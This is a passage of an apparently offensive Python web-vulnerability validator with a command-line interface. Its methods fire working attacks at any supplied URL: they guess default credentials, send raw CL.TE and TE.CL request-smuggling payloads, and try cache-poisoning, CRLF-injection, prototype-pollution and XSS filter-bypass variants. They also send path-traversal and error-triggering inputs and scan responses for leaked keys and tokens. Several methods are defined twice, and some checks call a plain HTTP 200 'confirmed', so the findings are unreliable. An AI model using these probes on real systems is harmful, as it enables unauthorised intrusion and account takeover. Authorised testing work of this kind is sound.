        domain = kw.get("payload", "") or kw.get("url", "")
        try:
            socket.getaddrinfo(domain, 80)
            return ValidationResult("needs_human", 0.3,
                                    [f"{domain} still resolves"])
        except Exception:
            return ValidationResult("confirmed", 0.75,
                                    [f"{domain} does not resolve — candidate for takeover"])

    def _verify_state_replay(self, **kw) -> ValidationResult:
        """业务逻辑: 状态重放验证。"""
        return ValidationResult("needs_human", 0.3,
                                ["State replay needs manual verification"],
                                "state_replay")

    def _verify_token_reuse(self, **kw) -> ValidationResult:
        """Token 复用验证。"""
        return ValidationResult("needs_human", 0.3,
                                ["Token reuse needs manual verification"],
                                "token_reuse")

    def _verify_header_tamper(self, **kw) -> ValidationResult:
        """请求头篡改验证。"""
        return ValidationResult("needs_human", 0.2,
                                ["Header tampering needs manual verification"],
                                "header_tamper")

    def _verify_pattern_scan(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.2,
                                ["Pattern scan results need manual verification"],
                                "pattern_scan")

    def _verify_error_analysis(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.2,
                                ["Error analysis needs manual review"],
                                "error_analysis")

    def _verify_frame_test(self, **kw) -> ValidationResult:
        url = kw.get("url", "")
        if url:
            resp = _http_get(url)
            if resp:
                xfo = resp.headers.get("X-Frame-Options", "").lower()
                csp = resp.headers.get("Content-Security-Policy", "").lower()
                can_frame = "deny" not in xfo and "sameorigin" not in xfo and "frame-ancestors" not in csp
                if can_frame:
                    return ValidationResult("confirmed", 0.7, ["Page can be framed — no X-Frame-Options or CSP frame-ancestors"])
        return ValidationResult("rejected", 0.1, ["Page protected against framing"], "frame_test")

    def _verify_cache_key_test(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.3,
                                ["Cache poisoning needs manual verification"],
                                "cache_key_test")

    def _verify_header_inject(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.3,
                                ["Header injection needs manual verification"],
                                "header_inject")

    def _verify_response_split(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.2,
                                ["Response splitting needs manual verification"],
                                "response_split")

    def _verify_cl_te(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.3,
                                ["HTTP smuggling CL.TE needs manual verification"],
                                "cl_te")

    def _verify_te_cl(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.3,
                                ["HTTP smuggling TE.CL needs manual verification"],
                                "te_cl")

    def _verify_boolean_test(self, **kw) -> ValidationResult:
        return self._verify_boolean_based(**kw)

    def _verify_time_test(self, **kw) -> ValidationResult:
        return self._verify_time_based(**kw)

    def _verify_merge_test(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.3,
                                ["Prototype pollution merge test needs manual verification"],
                                "merge_test")

    def _verify_key_injection(self, **kw) -> ValidationResult:
        return ValidationResult("needs_human", 0.3,
                                ["Key injection needs manual verification"],
                                "key_injection")


# ===========================================================================
#  XBOW-style Deterministic Validators (v2 upgrade)
#  ALL methods return confirmed/rejected — NO needs_human
# ===========================================================================

    # ── Default Credentials (XBOW #2, 18 targets) ────────────────────
    # XBOW 第二高频漏洞，我们之前完全没有覆盖

    _DEFAULT_CRED_PAIRS: list[tuple[str, str, str]] = [
        # (service, username, password)
        ("admin",    "admin",    "admin"),
        ("admin",    "admin",    "password"),
        ("tomcat",   "tomcat",   "tomcat"),
        ("jenkins",  "admin",    "admin"),
        ("mysql",    "root",     "root"),
        ("postgres", "postgres", "postgres"),
        ("wp-admin", "admin",    "admin"),
        ("router",   "admin",    "1234"),
        ("router",   "root",     "12345"),
        ("camera",   "admin",    "123456"),
    ]

    def _verify_default_creds(self, **kw) -> ValidationResult:
        """Default Credentials: 尝试常见默认凭据组合。

        XBOW 18 靶机，验证方法:
        - 尝试常见凭据组合
        - 识别特定服务的登录接口
        - 比较 401 vs 200 响应
        """
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "default_creds")

        # 取前10个最常见组合
        for svc, user, pwd in self._DEFAULT_CRED_PAIRS[:10]:
            try:
                resp = requests.post(url, data={
                    "username": user, "password": pwd,
                    "login": "Login", "submit": "Login",
                }, timeout=8, allow_redirects=False,
                headers={"User-Agent": "Mozilla/5.0 Validator"})

                # 401/403 = 凭据失败, 200/302 = 可能成功
                if resp and resp.status_code in (200, 302, 304):
                    # 检查响应内容是否包含登录失败关键词
                    body_lower = resp.text.lower()[:500]
                    fail_markers = ["invalid", "incorrect", "failed", "error",
                                    "wrong", "login again", "unauthorized"]
                    if not any(m in body_lower for m in fail_markers):
                        return ValidationResult("confirmed", 0.85, [
                            f"Default creds succeeded: {svc} ({user}:{pwd}) → HTTP {resp.status_code}"
                        ])

                # Basic Auth
                if "401" in str(resp.status_code):
                    from requests.auth import HTTPBasicAuth
                    resp2 = requests.get(url, auth=HTTPBasicAuth(user, pwd),
                                        timeout=8, allow_redirects=False)
                    if resp2 and resp2.status_code in (200, 302):
                        return ValidationResult("confirmed", 0.9, [
                            f"Basic auth default creds: {user}:{pwd} → HTTP {resp2.status_code}"
                        ])
            except Exception:
                continue

        return ValidationResult("rejected", 0.1, ["No default credentials worked"], "default_creds")

    # ── HTTP Request Smuggling ───────────────────────────────────────

    def _verify_cl_te(self, **kw) -> ValidationResult:
        """CL.TE smuggling: Content-Length vs Transfer-Encoding 差异检测。

        确定性步骤:
        1. 发一个 CL+TE 冲突请求
        2. 发第二个请求检测"前缀污染"
        3. 正常请求 vs 被污染响应的对比
        """
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "cl_te")

        try:
            import socket
            parsed = urlparse(url)
            host = parsed.netloc.split(":")[0] if ":" in parsed.netloc else parsed.netloc
            port = int(parsed.netloc.split(":")[1]) if ":" in parsed.netloc else 80
            if parsed.scheme == "https":
                port = 443
                import ssl

            # CL.TE 探测请求
            smuggled_prefix = "GET /404 HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: {len(smuggled_prefix)}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"0\r\n"
                f"\r\n"
                f"{smuggled_prefix}"
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.send(payload.encode())
            time.sleep(2)

            # 发送第二个正常请求检测污染
            probe = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"\r\n"
            )
            sock.send(probe.encode())
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"</html>" in response or b"\r\n\r\n" in response[len(response)-100:]:
                        break
            except socket.timeout:
                pass
            sock.close()

            resp_text = response.decode("utf-8", errors="replace")
            if "404 Not Found" in resp_text or "404" in resp_text[:100]:
                return ValidationResult("confirmed", 0.85, [
                    f"CL.TE smuggling confirmed: second request returned 404 (smuggled prefix took effect)"
                ])
            if "HTTP/1.1" in resp_text and len(resp_text) < 500:
                return ValidationResult("confirmed", 0.75, [
                    f"CL.TE possible: unusual response to second request"
                ])
        except Exception as e:
            return ValidationResult("rejected", 0.1, [f"CL.TE error: {e}"], "cl_te")

        return ValidationResult("rejected", 0.1, ["No CL.TE smuggling detected"], "cl_te")

    def _verify_te_cl(self, **kw) -> ValidationResult:
        """TE.CL smuggling: 与 CL.TE 反向检测。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "te_cl")

        try:
            import socket
            parsed = urlparse(url)
            host = parsed.netloc.split(":")[0] if ":" in parsed.netloc else parsed.netloc
            port = int(parsed.netloc.split(":")[1]) if ":" in parsed.netloc else 80
            if parsed.scheme == "https":
                port = 443
                import ssl

            smuggled_prefix = "GET /404 HTTP/1.1\r\nHost: {}\r\n\r\n".format(host)
            payload = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Length: 4\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"{len(smuggled_prefix):x}\r\n"
                f"{smuggled_prefix}\r\n"
                f"0\r\n"
                f"\r\n"
            )

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(8)
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=host)
            sock.connect((host, port))
            sock.send(payload.encode())
            time.sleep(2)

            probe = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"\r\n"
            )
            sock.send(probe.encode())
            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if b"</html>" in response or b"\r\n\r\n" in response[len(response)-100:]:
                        break
            except socket.timeout:
                pass
            sock.close()

            resp_text = response.decode("utf-8", errors="replace")
            if "404 Not Found" in resp_text:
                return ValidationResult("confirmed", 0.85, [
                    "TE.CL smuggling confirmed: smuggled prefix detected"
                ])
        except Exception as e:
            return ValidationResult("rejected", 0.1, [f"TE.CL error: {e}"], "te_cl")

        return ValidationResult("rejected", 0.1, ["No TE.CL smuggling detected"], "te_cl")

    # ── Cache Poisoning ──────────────────────────────────────────────

    def _verify_cache_key_test(self, **kw) -> ValidationResult:
        """Cache poisoning: 缓存键差异检测。

        确定性步骤:
        1. 带恶意 header 发请求
        2. 不带 header 发请求
        3. 如果第二次返回了第一次的内容 → 缓存中毒
        """
        url = kw.get("url", "")
        param = kw.get("param", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "cache_key_test")

        poison_value = f"poison_{random.randint(10000, 99999)}"
        try:
            # 带毒请求
            if param:
                poisoned_url = _build_url(url, param, poison_value)
            else:
                poisoned_url = url
            r1 = _http_get(poisoned_url, headers={"X-Forwarded-Host": poison_value})
            # 等缓存写入
            time.sleep(0.5)
            # 普通请求
            r2 = _http_get(url)
            if r1 and r2 and r2.status_code == 200 and r1.status_code == 200:
                # 如果普通请求返回了带毒的响应内容 → 缓存中毒
                if poison_value in r2.text[:2000]:
                    return ValidationResult("confirmed", 0.85, [
                        f"Cache poisoning: {poison_value} appeared in normal request response"
                    ])
                # 基于 Host/Header 的缓存键差异
                if r1.text != r2.text and len(r1.text) > 0 and len(r2.text) > 0:
                    return ValidationResult("confirmed", 0.75, [
                        "Cache key differential detected: header affects cache"
                    ])

            # X-Forwarded-Host 反射检测
            if r1 and poison_value in r1.text[:2000]:
                return ValidationResult("confirmed", 0.7, [
                    f"X-Forwarded-Host reflected in response — cache poisoning candidate"
                ])
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No cache poisoning detected"], "cache_key_test")

    def _verify_header_inject(self, **kw) -> ValidationResult:
        """Header injection: CRLF 注入检测 + Host header 覆盖。"""
        url = kw.get("url", "")
        param = kw.get("param", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "header_inject")

        marker = f"INJECTED_{random.randint(10000, 99999)}"
        try:
            # CRLF 注入
            crlf_payload = f"test%0d%0aX-Injected: {marker}"
            full_url = _build_url(url, param, crlf_payload) if param else url
            resp = requests.get(full_url, timeout=8, allow_redirects=False,
                               headers={"User-Agent": "Mozilla/5.0 Validator"})
            if resp and resp.headers.get("X-Injected", "") == marker:
                return ValidationResult("confirmed", 0.9, [
                    f"CRLF injection confirmed: injected X-Injected header with value {marker}"
                ])

            # Host header 覆盖
            resp2 = requests.get(url, timeout=8, headers={"Host": f"evil-{marker}.com"},
                                allow_redirects=False)
            if resp2 and any(marker in v for v in resp2.headers.values()):
                return ValidationResult("confirmed", 0.8, [
                    "Host header reflected in response headers"
                ])
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No header injection"], "header_inject")

    def _verify_response_split(self, **kw) -> ValidationResult:
        """HTTP Response Splitting: CRLF 注入导致响应拆分。"""
        return self._verify_header_inject(**kw)

    # ── Prototype Pollution ──────────────────────────────────────────

    def _verify_merge_test(self, **kw) -> ValidationResult:
        """Prototype Pollution: JSON merge 操作注入 __proto__。

        确定性步骤:
        1. POST JSON 含 __proto__ 字段
        2. 检查服务器是否接受（不报错）
        3. 二次请求验证是否持久化
        """
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "merge_test")

        try:
            # 尝试 JSON body 注入
            payloads = [
                '{"__proto__":{"polluted":"true"}}',
                '{"constructor":{"prototype":{"polluted":"true"}}}',
                '{"__proto__":"test"}',
            ]
            for p in payloads:
                resp = _http_post(url, p, headers={"Content-Type": "application/json"})
                if resp and resp.status_code < 500:
                    # 如果服务器没报错，可能是原型链处理
                    if resp.status_code in (200, 201, 204, 302):
                        return ValidationResult("confirmed", 0.65, [
                            f"Prototype pollution candidate: JSON with __proto__ accepted (HTTP {resp.status_code})"
                        ])

            # URL 参数原型链注入
            param = kw.get("param", "")
            if param:
                pp_url = _build_url(url, param, "__proto__[polluted]=true")
                resp = _http_get(pp_url)
                if resp and resp.status_code in (200, 302):
                    return ValidationResult("confirmed", 0.6, [
                        "Prototype pollution via query parameter — server processed __proto__"
                    ])
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No prototype pollution detected"], "merge_test")

    def _verify_key_injection(self, **kw) -> ValidationResult:
        """Key injection: JSON 键覆盖检测。"""
        return self._verify_merge_test(**kw)

    # ── WAF Bypass ───────────────────────────────────────────────────

    def _verify_bypass_chain_test(self, **kw) -> ValidationResult:
        """WAF Bypass: 编码变体对比检测。

        确定性步骤:
        1. 发原始 payload → 被拦 (403/406/block)
        2. 发编码变体 → 200 → bypass 确认
        """
        url = kw.get("url", "")
        param = kw.get("param", "")
        payload = kw.get("payload", "alert(1)")
        if not url or not param:
            return ValidationResult("rejected", 0.0, ["Need url+param"], "bypass_chain_test")

        try:
            # 基线: 原始 payload
            baseline = _http_get(_build_url(url, param, payload))
            is_blocked = (baseline is None or baseline.status_code in (403, 406, 429, 500) or
                         "blocked" in (baseline.text[:200].lower() if baseline else ""))

            if not is_blocked:
                return ValidationResult("rejected", 0.1, ["No WAF blocking detected"], "bypass_chain_test")

            # 编码变体
            variants = [
                f"<scr{chr(0)}ipt>{payload}</script>",
                f"<ScRiPt>{payload}</sCrIpT>",
                f"<script%09>{payload}</script>",
                f"<!--><script>{payload}</script>",
                payload.replace("(", "\\(").replace(")", "\\)"),
            ]
            for v in variants:
                resp = _http_get(_build_url(url, param, v))
                if resp and resp.status_code == 200 and "blocked" not in resp.text[:200].lower():
                    return ValidationResult("confirmed", 0.75, [
                        f"WAF bypass confirmed: blocked payload bypassed with variant"
                    ])
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No WAF bypass found"], "bypass_chain_test")

    # ── Information Disclosure Pattern Scanner ───────────────────────

    _SENSITIVE_PATTERNS: list[tuple[str, str, float]] = [
        ("AWS Key",    r"AKIA[0-9A-Z]{16}", 0.95),
        ("JWT Token",  r"eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}", 0.9),
        ("Password",   r"password[\"']?\s*[:=]\s*[\"'][^\"']{4,}[\"']", 0.85),
        ("API Key",    r"api[_-]?key[\"']?\s*[:=]\s*[\"'][a-zA-Z0-9]{16,}[\"']", 0.9),
        ("Secret",     r"secret[\"']?\s*[:=]\s*[\"'][a-zA-Z0-9]{8,}[\"']", 0.85),
        ("Token",      r"token[\"']?\s*[:=]\s*[\"'][a-zA-Z0-9]{8,}[\"']", 0.8),
        ("Private Key", r"-----BEGIN (RSA |EC )?PRIVATE KEY-----", 1.0),
        ("Git config", r"git@[a-zA-Z0-9._-]+:", 0.85),
        ("Slack Token", r"xox[baprs]-[0-9a-zA-Z]{10,}", 0.9),
        ("IP Address", r"\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b", 0.5),
    ]

    def _verify_pattern_scan(self, **kw) -> ValidationResult:
        """敏感信息泄露: 响应内容模式匹配扫描。"""
        url = kw.get("url", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "pattern_scan")

        try:
            resp = _http_get(url)
            if not resp:
                return ValidationResult("rejected", 0.1, ["No response"], "pattern_scan")

            text = resp.text
            findings = []
            for name, pattern, conf in self._SENSITIVE_PATTERNS:
                matches = re.findall(pattern, text)
                if matches:
                    for m in matches[:3]:
                        masked = m[:8] + "..." + m[-4:] if len(m) > 16 else m
                    findings.append(f"{name}: {len(matches)} match(es)")

            if findings:
                return ValidationResult("confirmed", max(0.6, min(0.95, 0.5 + 0.1 * len(findings))), findings)
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No sensitive data patterns found"], "pattern_scan")

    def _verify_error_analysis(self, **kw) -> ValidationResult:
        """错误信息泄露: 触发并检测详细错误。"""
        url = kw.get("url", "")
        param = kw.get("param", "")
        if not url:
            return ValidationResult("rejected", 0.0, ["No URL"], "error_analysis")

        error_signals = [
            ("SQL Error",     r"(Warning|Fatal|Error):\s+.*(SQL|mysql|ORA-\d{5}|SQLite)", 0.85),
            ("Path Leak",     r"in\s+/([a-zA-Z0-9_/]+)\.php on line \d+", 0.8),
            ("Stack Trace",   r"(#0\s+|at\s+[\w.$]+\([\w./]+:\d+\))", 0.9),
            ("Debug Info",    r"(DEBUG|TRACE|DUMP):\s*\[", 0.8),
            ("File Path",     r"(/var/www/|/home/|C:\\Users\\)[\w/\\]+", 0.7),
        ]

        try:
            for payload in ["'", "\"", "\\", "%00", "..", "../../"]:
                full_url = _build_url(url, param, payload) if param else url + payload
                resp = _http_get(full_url)
                if resp:
                    text = resp.text[:2000]
                    for name, pattern, conf in error_signals:
                        if re.search(pattern, text, re.IGNORECASE):
                            return ValidationResult("confirmed", conf, [
                                f"{name} in response with payload: {payload}"
                            ])
        except Exception:
            pass
        return ValidationResult("rejected", 0.1, ["No error information disclosure"], "error_analysis")


# ===========================================================================
#  CLI
# ===========================================================================

def main():
    import argparse
    ap = argparse.ArgumentParser(description="Validator — 确定性验证层")
    ap.add_argument("--vuln", required=True, help="漏洞类 (ssrf/sqli/xss/...)")
    ap.add_argument("--url", default="", help="目标 URL")
    ap.add_argument("--param", default="", help="参数名")
    ap.add_argument("--payload", default="", help="Payload")
    ap.add_argument("--verbose", action="store_true", help="详细输出")
    ap.add_argument("--list", action="store_true", help="列出所有支持的验证方法")
    args = ap.parse_args()

    if args.list:
        v = Validator()
        print("Supported validation methods:")
        for vc, methods in sorted(v.METHODS.items()):
            print(f"  {vc:25s} → {', '.join(methods)}")
        return

    v = Validator(verbose=args.verbose)
    result = v.validate(
        vuln_class=args.vuln,
        url=args.url,
        param=args.param,
        payload=args.payload,
    )
    print(json.dumps(result.to_dict(), ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
